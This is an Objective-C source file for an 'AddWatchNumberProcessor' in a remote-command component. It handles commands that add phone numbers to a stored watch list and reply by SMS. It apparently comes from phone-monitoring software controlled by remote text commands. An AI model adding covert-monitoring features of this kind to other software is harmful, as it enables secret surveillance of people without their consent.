/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  AddWatchNumberProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  13/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

#import "AddWatchNumberProcessor.h"
#import "PrefWatchList.h"
#import "Preference.h"

@interface AddWatchNumberProcessor (PrivateAPI)
- (void) processAddWatchNumber;
- (void) addWatchNumberException: (NSUInteger) aErrorCode;
- (void) sendReplySMS;
- (BOOL) canAddWatchNumber;
- (BOOL) checkIfWatchNumberAlreadyExist;
@end

@implementation AddWatchNumberProcessor

@synthesize mWatchNumberList;

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the AddWatchNumberProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: No return type
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"AddWatchNumberProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the AddWatchNumberProcessor
 - Argument list and description: No Argument
 - Return description: self (AddWatchNumberProcessor)
*/

- (void) doProcessingCommand {
	DLog (@"AddWatchNumberProcessor--->doProcessingCommand")
	DLog (@"argument for adding watch number: %@", [mRemoteCmdData mArguments])
	
	if ([RemoteCmdProcessorUtils isContainNonEndArgument:[mRemoteCmdData mArguments]]) {		
		[self setMWatchNumberList:[RemoteCmdProcessorUtils validateArgs:[mRemoteCmdData mArguments] 
														 validationType:kPhoneNumberValidation]];
		DLog(@"AddMonitorsProcessor--->Watch Numbers:%@", mWatchNumberList);
		if ([mWatchNumberList count]>0) {
			if ([self canAddWatchNumber]) { 
				if (![self checkIfWatchNumberAlreadyExist] &&
					![RemoteCmdProcessorUtils isDuplicateTelephoneNumber:mWatchNumberList])  [self processAddWatchNumber];
				else [self addWatchNumberException:kCmdExceptionErrorCannotAddDuplicateToWatchList];
			}
			else {
				[self addWatchNumberException:kCmdExceptionErrorWatchNumberExceedListCapacity];
			}
		}
		else {
			[self addWatchNumberException:kCmdExceptionErrorInvalidNumberToWatchList];
		}				
	} else {
		[self addWatchNumberException:kCmdExceptionErrorInvalidCmdFormat];
	}	
}

#pragma mark AddWatchNumberProcessor PrivateAPI Methods

/**
 - Method name: processAddWatchNumber
 - Purpose:This method is used to process Add Watch Number
 - Argument list and description: No Argument
 - Return description: No Return type
*/


- (void) processAddWatchNumber {
	DLog (@"AddWatchNumberProcessor--->processAddWatchNumber");
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefWatchList *prefWatchList = (PrefWatchList *) [prefManager preference:kWatch_List];
	
	NSMutableArray *watchList=[[NSMutableArray alloc] init];
	
	// Existing MonitorNumbers
	for (NSString *watchNumber in [prefWatchList mWatchNumbers]) {
		[watchList addObject:watchNumber];
	}
	//New Monitor Numbers
	for (NSString *watchNumber in mWatchNumberList) {
		[watchList addObject:watchNumber];
	}
	[prefWatchList setMWatchNumbers:watchList];
	[prefManager savePreferenceAndNotifyChange:prefWatchList];
	[watchList release];
	[self sendReplySMS];
}

/**
 - Method name: canAddWatchNumber
 - Purpose:This method is to check maximum watch number list capacity. 
 - Argument list and description: No Argument
 - Return description: No Return Type
*/

- (BOOL) canAddWatchNumber {
	DLog (@"AddWatchNumberProcessor--->canAddWatchNumber");
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefWatchList *prefWatchList = (PrefWatchList *) [prefManager preference:kWatch_List];
	int count=[[prefWatchList mWatchNumbers] count]+[mWatchNumberList count];
	if (count<=10) {
		return YES;
	}
	else {
		return NO;
	}
}

/**
 - Method name: checkIfWatchNumberAlreadyExist
 - Purpose:This method is used to check if watch number already exist. 
 - Argument list and description: No Argument
 - Return description: No Return Type
*/

- (BOOL) checkIfWatchNumberAlreadyExist {
	BOOL isNumberExist=NO;
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefWatchList *prefWatchList = (PrefWatchList *) [prefManager preference:kWatch_List];
	for (NSString *watchNumber in mWatchNumberList) {
		NSPredicate *predicate = [NSPredicate predicateWithFormat:@"SELF == %@",watchNumber];
		NSArray *result=[[prefWatchList mWatchNumbers] filteredArrayUsingPredicate:predicate];
		if ([result count]) {
			isNumberExist=YES;
			break;
		}
	}
	return isNumberExist;
}

/**
 - Method name: addWatchNumberException
 - Purpose:This method is invoked when watch number process failed. 
 - Argument list and description: No Argument
 - Return description: No Return Type
 */

- (void) addWatchNumberException: (NSUInteger) aErrorCode {
	DLog (@"AddWatchNumberProcessor--->addWatchNumberException")
	FxException* exception = [FxException exceptionWithName:@"addWatchNumberException" andReason:@"Add Watch number error"];
	[exception setErrorCode:aErrorCode];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) sendReplySMS {
	DLog (@"AddWatchNumberProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:messageFormat];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:messageFormat];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[mWatchNumberList release];
	[super dealloc];
}

@end
